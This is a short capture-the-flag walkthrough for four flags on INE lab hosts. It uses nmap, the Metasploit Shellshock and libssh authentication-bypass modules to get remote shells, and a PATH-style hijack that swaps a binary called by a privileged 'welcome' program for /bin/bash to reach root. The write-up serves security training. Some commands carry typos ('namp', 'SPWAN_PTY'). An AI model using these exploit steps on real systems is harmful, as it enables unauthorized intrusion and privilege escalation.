# Flag 1
Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.

```
namp -sV -sC -p- target1.ine.local
```
```
msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi/
set LHOST eth1
run

cd ../../../
ls
cat flag.txt
```
# Flag 2
In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
- in the same above session
```
cd /opt/apache/htdocs/
ls
cat flag.txt
```
# Flag 3
Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
```
namp -sV -sC -p- target2.ine.local
```
```
msfconsole
search libssh
use 0
set RHOSTS target2.ine.local
set SPWAN_PTY true
run
```
```
/bin/bash -i
ls 
cat flag.txt
```
# Flag 4
The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.
```shell
ls -la
./welcome

file welcome
strings welcome

rm greetings
cp /bin/bash greetings
ls

rerun the script
./welcome
```